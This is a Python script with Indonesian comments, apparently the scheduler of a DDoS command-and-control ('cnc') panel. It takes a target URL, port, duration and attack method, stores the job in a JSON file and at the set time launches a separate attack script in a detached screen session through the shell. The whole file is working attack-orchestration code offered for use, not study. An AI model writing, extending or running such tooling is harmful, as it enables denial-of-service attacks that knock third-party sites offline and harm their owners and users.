import os
import json
import threading
import subprocess
import sys
from datetime import datetime

# Nama file untuk menyimpan jadwal serangan
SCHEDULE_FILE = "scheduled.json"

# Fungsi untuk memuat data jadwal serangan dari file JSON
def load_scheduled_attacks():
    if os.path.exists(SCHEDULE_FILE):
        with open(SCHEDULE_FILE, "r") as f:
            return json.load(f)
    return []

# Fungsi untuk menyimpan data jadwal serangan ke file JSON
def save_scheduled_attacks():
    with open(SCHEDULE_FILE, "w") as f:
        json.dump(scheduled_attacks, f, indent=4)

# Daftar serangan yang dijadwalkan
scheduled_attacks = load_scheduled_attacks()

def remove_completed_attack(url, port, duration, method, schedule_time):
    """
    Menghapus serangan yang telah selesai dari file scheduled.json.
    """
    global scheduled_attacks
    scheduled_attacks = [
        attack for attack in scheduled_attacks
        if not (
            attack['url'] == url and
            attack['port'] == port and
            attack['duration'] == duration and
            attack['method'] == method and
            attack['time'] == schedule_time
        )
    ]
    save_scheduled_attacks()
    print(f"(cnc) Serangan ke {url}:{port} dengan metode {method} telah selesai dan dihapus dari jadwal.")

def run_attack(url, port, duration, method, schedule_time):
    """
    Menjalankan serangan dan menghapusnya dari jadwal setelah selesai.
    """
    try:
        # Bangun perintah untuk menjalankan api.py dengan screen
        command = f"screen -dm python3 api.py {url} {port} {duration} {method}"

        # Jalankan serangan
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"(cnc) Serangan ke {url}:{port} dengan metode {method} sedang berjalan selama {duration} detik.")

        # Tunggu hingga durasi selesai
        threading.Timer(duration, remove_completed_attack, [url, port, duration, method, schedule_time]).start()
    except Exception as e:
        print(f"(cnc) Terjadi kesalahan saat menjalankan serangan: {e}")

def schedule_attack(url, port, duration, method, schedule_time):
    """
    Menjadwalkan serangan untuk waktu tertentu.
    """
    try:
        # Parse waktu yang dijadwalkan dalam format "YYYY-MM-DD HH:MM:SS"
        schedule_time_obj = datetime.strptime(schedule_time, "%Y-%m-%d_%H:%M:%S")
        now = datetime.now()

        if schedule_time_obj < now:
            print("(cnc) Waktu jadwal telah berlalu, serangan akan dimulai segera.")
            run_attack(url, port, duration, method, schedule_time)
            return

        delay = (schedule_time_obj - now).total_seconds()

        # Tambahkan ke daftar jadwal
        scheduled_attacks.append({
            'url': url,
            'port': port,
            'duration': duration,
            'method': method,
            'time': schedule_time
        })

        # Simpan kembali ke file JSON setelah penambahan
        save_scheduled_attacks()

        # Jalankan serangan setelah delay
        threading.Timer(delay, run_attack, [url, port, duration, method, schedule_time]).start()
        print(f"(cnc) Serangan dijadwalkan untuk {schedule_time_obj.strftime('%Y-%m-%d_%H:%M:%S')}")
    except ValueError:
        print("(cnc) Format waktu salah! Gunakan YYYY-MM-DD_HH:MM:SS.")

if __name__ == "__main__":
    # Jika dijalankan dengan argumen command line
    if len(sys.argv) == 6:
        try:
            url = sys.argv[1]
            port = int(sys.argv[2])
            duration = int(sys.argv[3])
            method = sys.argv[4]
            schedule_time = sys.argv[5]

            # Jalankan fungsi schedule_attack
            schedule_attack(url, port, duration, method, schedule_time)
        except ValueError:
            print("(cnc) Format perintah salah! Contoh: python3 script.py https://example.com 443 10 tls 2024-12-14 08:21:00")
    else:
        print("(cnc) Format salah! Gunakan: python3 script.py <url> <port> <duration> <method> <schedule_time>")
        print("Contoh: python3 script.py https://example.com 443 10 tls 2024-12-14_08:21:00")
